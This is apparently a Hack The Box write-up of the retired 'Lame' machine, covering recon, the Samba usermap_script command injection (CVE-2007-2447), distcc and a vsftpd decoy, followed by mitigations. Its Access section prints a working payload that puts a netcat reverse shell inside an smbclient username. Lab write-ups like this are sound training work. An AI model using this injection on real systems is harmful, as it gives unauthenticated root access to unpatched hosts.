---
machine: Lame
os: Linux
difficulty: Easy
platform: Hack The Box
category: SMB / Legacy services
state: Retired
tags: [samba, usermap_script, distcc, vsftpd, cve-2007-2447]
---

# Lame — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no flags or real credentials.

## TL;DR

The first machine ever published. A **Samba 3.0.20** with `usermap_script` (CVE-2007-2447) yields **direct root** without authentication: the username is interpolated into a shell script, so a quote plus `;` runs commands. `vsftpd 2.3.4` and `distcc` are the other two known doors.

## Recon

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
21/tcp   open  ftp      vsftpd 2.3.4
22/tcp   open  ssh      OpenSSH 4.7p1
139/tcp  open  netbios-ssn   Samba smbd 3.0.20-Debian
445/tcp  open  netbios-ssn   Samba smbd 3.0.20-Debian
3632/tcp open  distccd  distccd v1
```

## Access

**Samba `usermap_script` (CVE-2007-2447)** — the root path:

```bash
# the username is interpolated into a shell script without sanitising
smbclient //<IP>/tmp -N -U '/=`nohup nc -e /bin/sh <LHOST> 4444`'
```

Metasploit alternative: `exploit/multi/samba/usermap_script`.

**distcc (CVE-2004-2687)** — execution as `daemon`:

```bash
# module: exploit/unix/misc/distcc_exec
```

**`vsftpd 2.3.4`** — the `:)` backdoor is famous, but this build is **not** the backdoored one: port 6200 never opens and the trigger leaves nothing behind. The version is a lure, not a third door.

## Escalation

Through Samba the session is already `uid=0`. Through `distcc` you land as `daemon` and must enumerate locally:

```bash
id; uname -a; ls -la /home; find / -perm -4000 -type f 2>/dev/null
```

## Pitfalls

- **`vsftpd`**: chasing the backdoor is the biggest time sink here; the binary is stock.
- **`distcc`**: it can be patched even when the version looks ancient; test before committing to that path.
- **Modern SMB**: a current client may refuse the dialect; use `-m SMB2` or the MSF module.
- **Payloads**: the reverse shell lives inside the username; quoting and escaping are half the work.

## Lessons

- A 2007 service in 2017 is an invitation: versions → public CVEs.
- `usermap_script` is **command injection** through the user string.
- Exposed `distcc` is remote execution without credentials.
- Mitigation: patched Samba, no exposed `distcc`, and `vsftpd` out of production.
